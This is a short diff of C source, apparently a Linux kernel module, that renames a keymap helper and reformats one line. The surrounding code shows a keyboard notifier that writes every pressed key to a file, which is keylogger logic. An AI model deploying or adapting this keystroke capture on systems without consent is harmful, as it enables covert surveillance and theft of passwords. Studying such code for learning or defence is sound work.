@@ -58,13 +58,10 @@ static const char *us_keymap[][2] = {
 
 struct file *f;
 
-void keycode_to_string(int keycode, int shift_mask, char *buf)
+void ft_keycode_to_string(int keycode, int shift_mask, char *buf)
 {
 	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
-		const char *us_key = (shift_mask == 1)
-		? us_keymap[keycode][1]
-		: us_keymap[keycode][0];
-
+		const char *us_key = (shift_mask == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
 		snprintf(buf, MAX_BUFF_SIZE, "%s", us_key);
 	}
 }
@@ -77,7 +74,7 @@ int keyboard_event(struct notifier_block *nblock, unsigned long code, void *_par
 	if (!(param->down))
 		return (0);
 
-	keycode_to_string(param->value, param->shift, key);
+	ft_keycode_to_string(param->value, param->shift, key);
 
 	if(strlen(key) > 0)
 		kernel_write(f, key, strlen(key), &f->f_pos);  
